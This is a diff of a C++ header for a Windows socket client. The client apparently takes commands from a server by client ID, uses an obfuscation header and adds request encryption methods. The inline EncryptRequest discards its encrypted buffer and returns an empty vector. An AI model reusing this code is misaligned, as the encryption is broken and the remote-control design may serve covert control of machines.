@@ -2,9 +2,12 @@
 #define _CLIENT_H_
 
 #include "framework.h"
-#include "networking_types.h"
+#include "net_types.h"
 #include "obfuscate.h"
+#include "net_common.h"
+
 #include <memory>
+#include <algorithm>
 
 class Client {
 public:
@@ -15,9 +18,11 @@ public:
 	BOOL          Connect();
     BOOL          Disconnect();
     BOOL          MakeServerRequest( ClientRequest request, BOOL udp ); // Make a request from client to server 
-
-protected:
+    BOOL          PingServer(SocketTypes serverType);
+    BOOL          ReceiveDataOnSocket(SocketTypes s);
     
+protected:
+
     /*
         Load all dynamically loaded wsa functions
     */
@@ -28,7 +33,17 @@ protected:
         and a defined type of socket in 'type'
     */
     BOOL          SocketReady(SocketTypes type) const;
-    
+
+    inline std::vector<unsigned char> EncryptRequest(ClientRequest req) const {
+        NET_BLOB blob;
+        blob.aesKey = this->EncryptionKey;
+        blob.cr     = req;
+        std::vector<unsigned char> buff = NetCommon::AESEncryptBlob(blob);
+
+        return {};
+    }
+   
+    BOOL          DecryptRequest(ServerRequest& req);
 
     /*
         Send a message to the main tcp server
@@ -76,7 +91,7 @@ protected:
     SOCKET        TCPSocket       = INVALID_SOCKET;
     Server        ConnectedServer = { 0 };          // Information on the clients connected server
     long          ClientUID       = -1;             // UID is assigned by the server. Used to perform commands on one client
-    std::string   PublicEncryptionKey;
+    std::string   EncryptionKey;                    // Public encryption key for RSA, ENCRYPT AND DECRYPT KEY FOR AES
 };
 
 #endif
